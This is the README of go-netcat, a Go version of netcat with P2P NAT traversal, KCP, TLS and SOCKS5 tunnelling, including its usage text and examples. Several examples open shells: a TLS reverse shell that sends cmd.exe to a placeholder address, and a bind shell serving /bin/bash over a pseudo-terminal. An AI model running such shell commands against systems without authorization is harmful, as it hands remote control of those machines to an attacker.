## go-netcat 简介

golang版 netcat, 更方便的建立点对点通信。

有以下特点：

 - 🔁 自动化内网穿透：使用 -p2p 自动实现 TCP/UDP 的 NAT 打洞与点对点连接，无需手动配置，依赖公共 TURN 和 MQTT 服务交换地址信息。

 - 🚀 UDP 稳定传输通道：集成 KCP 协议，TCP无法穿透NAT的情况，用基于UDP的KCP也能保持通信的可靠性。

 - 🔒 加密支持：支持 TCP 的 TLS 和 UDP 的 DTLS 加密传输。

 - 🧩 可嵌入服务程序：通过 -exec 将工具作为子服务启动，结合多路复用能力，支持流量转发、Socks5 代理等场景。

 - 🖥️ 伪终端支持：配合 -exec 和 -pty，为类似 /bin/sh 的交互式程序提供伪终端环境，增强 shell 控制体验（支持 TAB、Ctrl+C 等）。

 - 💻 原始输入模式：-pty 启用控制台 raw 模式，在获取 shell 时提供更贴近原生终端的操作体验。

 - 📈 实时速度统计：提供发送与接收方向的实时速度统计，便于测试传输性能。


## 使用方法
```
Usage of gonc:
  -C    enable CRLF
  -app-mux
        a Stream Multiplexing based proxy app
  -auth string
        user:password for SOCKS5 proxy; preshared key for kcp
  -bind string
        ip:port
  -exec string
        runs a command for each connection
  -inprogress
        show transfer progress
  -kcp
        use UDP+KCP protocol, -u can be omitted
  -kcps
        kcp server mode
  -keep-open
        keep listening after client disconnects
  -keepalive int
        none 0 will enable TCP keepalive feature
  -l    listen mode
  -local string
        ip:port (alias for -bind)
  -mqttsrv string
        MQTT server (default "tcp://broker.hivemq.com:1883")
  -mux-address string
        host:port (for connect or listen mode)
  -mux-engine string
        yamux | smux (default "smux")
  -mux-mode string
        connect | listen | stdio (default "stdio")
  -outprogress
        show transfer progress
  -p2p string
        UID-A:UID-B
  -peer string
        peer address to connect, will send a ping/SYN for NAT punching
  -pty
        <-exec> will run in a pseudo-terminal, and put the terminal into raw mode
  -punchdata string
        UDP punch payload (default "ping\n")
  -remote string
        host:port
  -s5 string
        ip:port (SOCKS5 proxy)
  -sendfile string
        path to file to send (optional)
  -sni string
        specify TLS SNI
  -stderr
        when -exec, Merge stderr into stdout
  -tls
        Enable TLS connection
  -tls10
        force negotiation to specify TLS version
  -tls11
        force negotiation to specify TLS version
  -tls12
        force negotiation to specify TLS version
  -tls13
        force negotiation to specify TLS version
  -tlsserver
        force as TLS server while connecting
  -turn
        use STUN to discover public IP
  -turnsrv string
        turn server (default "turn.cloudflare.com:3478")
  -u    use UDP protocol

```

## 例子

- 这个工具可以像nc那样用，例如

    `gonc.exe www.baidu.com 80`

    `gonc.exe -tls www.baidu.com 443`


- 用TCP直接在两个内网P2P通信，要自己约定两个唯一ID，例如randomA和randomB，每次用都随机换ID避免和别人一样。

    `gonc.exe -tlsserver -p2p randomA:randomB`

    另一端用

    `gonc.exe -tls -p2p randomB:randomA`

- 由于TCP穿透NAT不如UDP成功率高，可以基于UDP的KCP协议实现通信，这样建立的是可靠传输的UDP

    `gonc.exe -kcps -p2p randomA:randomB`

    另一端用

    `gonc.exe -kcp -p2p randomB:randomA`


- 支持使用socks5代理

    `gonc.exe -s5 s.s.s.s:port x.x.x.x 1234`

- 支持监听或反弹shell
    
    监听

    `gonc.exe -tls -keep-open -exec cmd.exe -stderr -l 1234`

    反弹

    `gonc.exe -tls -exec cmd.exe -stderr x.x.x.x 1234`

- 类UNIX支持pseudo-terminal shell 

    监听

    `gonc -tls -pty -exec /bin/bash -l 1234`

    连接获得shell(windows和linux都支持console raw模式，该模式下支持TAB、ctrl+c等输入)

    gonc.exe -tls -pty x.x.x.x 1234

- 还可以像socat那样建立左右两个通道转发数据

    `gonc.exe -keep-open -exec "./gonc -tls www.baidu.com 443" -l 8000`
    
    另一端用

    `gonc.exe 127.0.0.1 8000 > NUL`

- 发送和统计传输速度，内置/dev/zero和/dev/urandom实现，这样windows下也可以用/dev/zero和/dev/urandom

    `gonc.exe -sendfile /dev/zero -outprogress x.x.x.x 1234`

    `13040386048 bytes (12.1 GiB) copied, 00:00:04, 2.6 GiB/s`

    另一端用

    `gonc.exe -l 1234 > NUL`

- 建立P2P隧道并提供socks5代理

    `gonc.exe -tlsserver -p2p randomA:randomB -exec ". -app-mux socks5"`

    另一端(本机开socks5端口)

    `gonc.exe -tls -p2p randomB:randomA -exec ". -app-mux -l 1080"`
